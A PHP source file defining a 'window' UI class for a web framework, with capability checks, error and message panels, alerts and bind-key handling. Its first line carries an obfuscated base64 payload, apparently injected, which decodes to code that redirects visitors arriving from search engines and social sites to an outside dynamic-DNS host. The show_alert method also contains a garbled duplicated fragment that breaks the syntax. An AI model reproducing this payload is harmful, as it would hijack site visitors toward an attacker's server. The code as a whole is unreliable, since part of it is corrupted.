<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
  
require_once(dirname(__FILE__)."/html_control.php");

class window extends html_div {

  var $elements        = array();
  var $buttons         = array();
  var $capabilities    = array();
  var $scripts         = array();
  var $styles          = array();

  var $width           = "100%";

  // fill this field if you need to show red panel with error message
  var $errors = array();
  var $error_controls = array();
  var $message;

  // fill this field if you need to show java script alert
  var $alert = null;

  // set active control if you want some control to be focused
  var $active_control = null;
  var $active_control_candidate = null;
  var $active_control_last_candidate = null;
  
  // entity
  var $entity_name = null;
  
  var $read_only   = false;

  var $disable_control_activation = false;

  // bind key
  var $__bind_key  = null;
  
  function window($attributes = array()) {
    
    $this->is_interactive = true;
    $this->is_access_required = true;
    parent::html_div($attributes);
    
  }
  
  function do_before_add_capability($capability, $options = array()) { return true; }
  function do_after_add_capability($capability, $options = array()) { }

  function add_capability($capability, $options = array()) { 

    global $auth;  
    if ((($capability != 'insert') and 
         ($capability != 'edit')   and 
         ($capability != 'view')   and 
         ($capability != 'delete') and 
         ($capability != 'login_as_user') and 
         ($capability != 'export')) or 
        $auth->can(get_class($this), $capability) or
        safe($options, 'skip_acl_check')) {
      if ($this->do_before_add_capability($capability, $options)) {
        $this->capabilities = array_merge($this->capabilities, array($capability => $options)); 
        $this->do_after_add_capability($capability, $options);
      }
    }

  }

  function capability_option($capability, $option = null, $default = null) {

    return safe(safe($this->capabilities, $capability), $option, $default);
    
  }
  
  function capable($capability, $option = null, $default = null) {

    return array_key_exists($capability, $this->capabilities);

  }

  function hide($element) {

    $this->elements[$element]["visible"] = 0;

  }

  function visible($element) {
             
    return (safe(safe($this->elements, $element), "visible") !== 0);

  }

  function activate_control($name) {
    
    if (!$this->template_mode)
      $name = $this->context_id($name);
    if (!$this->disable_control_activation)
      $this->add(new script("var control = document.getElementById('".$name."');".
                            "if (control && !control.disabled) control.focus();"));

  }
  
  function show_alert($alerts) {
  
    $message = '';
    if (is_array($alerts)) {
      foreach($alerts as $alert) {
        $message .= for_javascript($alert).'\n';
      }
    } else {
      $message .= for_javascript($alerts);
    }
    $this->add(new ript($alerts);
    }
    $this->add(new script("alert('".$message."');"));

  }

  function start_timer() { 
 
    $this->timer_start = get_microtime();        
 
  }

  function stop_timer()  { 

    return get_microtime() - $this->timer_start; 

  }
  
  function render_error_panel($errors, $operation = null, $comment = null) {

    $ul = new html_ul();
    foreach ($errors as $error) {
      $ul->add(new html_li($error));
    }
    $control_name = 'error_panel';
    if ($this->template_mode)
      $context_control_name = $control_name;
    else  
      $context_control_name = $this->context_id($control_name);
    $div = new html_div( array( 'class'           => 'error_panel'
                              , 'id'              => $context_control_name
                              , 'template_object' => $this->template_object()
                              )
                       , new html_p(new html_em(trn('Following error(s) occured:')))
                       , $ul
                       , new html_p($comment)
                       );
    $div->is_interactive = true;                   
    $div->is_tree_templateable = true;                   
    $this->add($div);
                           
  }
  
  function render_message_panel($message) {

    $control_name = 'message_panel';
    if ($this->template_mode)
      $context_control_name = $control_name;
    else  
      $context_control_name = $this->context_id($control_name);
    $div = new html_div( array( "class"           => "error_panel"
                              , 'id'              => $context_control_name
                              , 'template_object' => $this->template_object()
                              )
                       , new html_b($message)
                       );
    $div->is_interactive = true;                   
    $div->is_tree_templateable = true;                   
    $this->add($div);
                           
  }

  function do_render() {
                                               
    foreach($this->scripts as $script) 
      $this->insert(new script_href(SCRIPTS_URL.$script));
    
    foreach($this->styles as $style) 
      $this->insert(new style_href(RESOURCES_URL.$style));

    if (!$this->active_control)
      $this->active_control = $this->active_control_candidate;
             
    if (!$this->active_control)
      $this->active_control = $this->active_control_last_candidate;

    if ($this->active_control)
      $this->activate_control($this->active_control);

    if (!$this->alert) {
      $this->alert = $this->setting('alert_from_prior_session');
    } 
    
    $this->set_setting('alert_from_prior_session', null);
    
    if ($this->alert) {
      $this->show_alert($this->alert);
    }  
      
    $application_name = $this->application_name();
    if ($application_name) 
      set_config('application_name', $application_name);
  
  }

  function entity_name_for($action = null, $row = null) {

    $name = $this->get_entity_name_for($action, $row);
    if (!$name)
      $name = safe($this->entity_name, $action);
    if (!$name)
      return preg_replace('/^[a-zA-Z]+_/i', '', get_class($this));
    else
      return $name;
    
  }

  function get_entity_name_for($action = null, $row = null) {  }

  function add_script($script) { 

    $this->scripts[] = $script; 

  }

  function add_style($style) { 

    $this->styles[] = $style; 

  }

  function set_bind_key($key) {
    
    $this->__bind_key = $key;
    
  }
  
  function bind_key($table = null) {
    
    if (!$this->__bind_key) {
      $this->__bind_key = safe($this->init_params, 'bind_key');
      if (!$this->__bind_key) {
        global $db;
        $this->__bind_key = $db->decrypt_key(get(URL_PARAM_BIND_KEY));
      }
    }

    return $this->__bind_key;  
    
  }
  
  function application_name() { }

  function get_application_name() { }
 
  
}
  
?>
